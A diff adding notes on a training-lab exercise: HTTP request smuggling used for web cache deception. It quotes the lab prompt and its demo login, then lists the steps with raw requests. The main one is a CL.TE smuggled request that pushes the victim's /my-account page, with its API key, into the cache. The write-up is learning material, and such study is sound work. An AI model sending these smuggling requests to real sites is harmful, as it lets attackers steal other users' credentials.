@@ -502,7 +502,97 @@ now we have an alert box for any client that connects to the server!
 
 ## 0x12: Exploiting HTTP request smuggling to perform web cache deception
 
+Prompt:
+> This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. The front-end server is caching static resources.
+> 
+> To solve the lab, perform a request smuggling attack such that the next user's request causes their API key to be saved in the cache. Then retrieve the victim user's API key from the cache and submit it as the lab solution. You will need to wait for 30 seconds from accessing the lab before attempting to trick the victim into caching their API key.
+> 
+> You can log in to your own account using the following credentials: wiener:peter
+> Notes
+> 
+> Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the Request attributes section of the Inspector panel.
+>     The lab simulates the activity of a victim user. Every few POST requests that you make to the lab, the victim user will make their own request. You might need to repeat your attack a few times to ensure that the victim user's request occurs as required.
+
 asdf
+
+step 1 - identify the sensitive data in the request
+
+logging in, the my account page has an API key field in a div
+verified that you can drop the `?id=wiener` param and it still returns the data
+
+step 2 - find the HRS
+
+detected via homepage:
+```
+POST / HTTP/1.1
+Host: 0ab500460427f24983554bba00e600d7.web-security-academy.net
+Content-Length: 6
+Transfer-Encoding: chunked
+
+0
+
+x
+```
+
+```HTTP
+HTTP/1.1 404 Not Found
+Content-Type: application/json; charset=utf-8
+Set-Cookie: session=f3vft7eJH0xOld5R34zXN2OiMdJuTZPK; Secure; HttpOnly; SameSite=None
+X-Frame-Options: SAMEORIGIN
+Connection: close
+Content-Length: 11
+
+"Not Found"
+```
+
+step 3 - find a static endpoint that is cached
+
+As with the previous cache poison lab, tracking.js shows up as a static cached file
+
+request
+```
+GET /resources/js/tracking.js HTTP/2
+Host: 0ab500460427f24983554bba00e600d7.web-security-academy.net
+```
+
+response
+```HTTP
+HTTP/2 200 OK
+Content-Type: application/javascript; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Cache-Control: max-age=30
+Age: 0
+X-Cache: hit
+Content-Length: 70
+
+document.write('<img src="/resources/images/tracker.gif?page=post">');
+```
+
+technically this could end up being _any_ of the cached files, but this is one of the first ones that stream in the proxy tab after loading the root
+
+step 4 - point the HRS to the sensitive data
+
+we're just putting the pieces together at this point:
+
+```
+POST / HTTP/1.1
+Host: 0ab500460427f24983554bba00e600d7.web-security-academy.net
+Content-Length: 37
+Transfer-Encoding: chunked
+
+0
+
+GET /my-account HTTP/1.1
+Foo: X
+```
+
+step 5 - wait for user to cache their data && call the cached endpoint
+
+this part is annoying, but easy - just keep re-trying the deception, waiting, and refreshing the main page until it sticks the user's data into one of the cached files
+
+easier if you filter on 'X-Cache: hit' (since a miss indicates first caching of a resource, and we shouldn't care about that state)
+make sure that JS files aren't filtered, and even include images and anything you wouldn't normally think about checking - as long as it's cached, it's fair game
+
 
 ## 0x13: Bypassing access controls via HTTP/2 request tunnelling
 
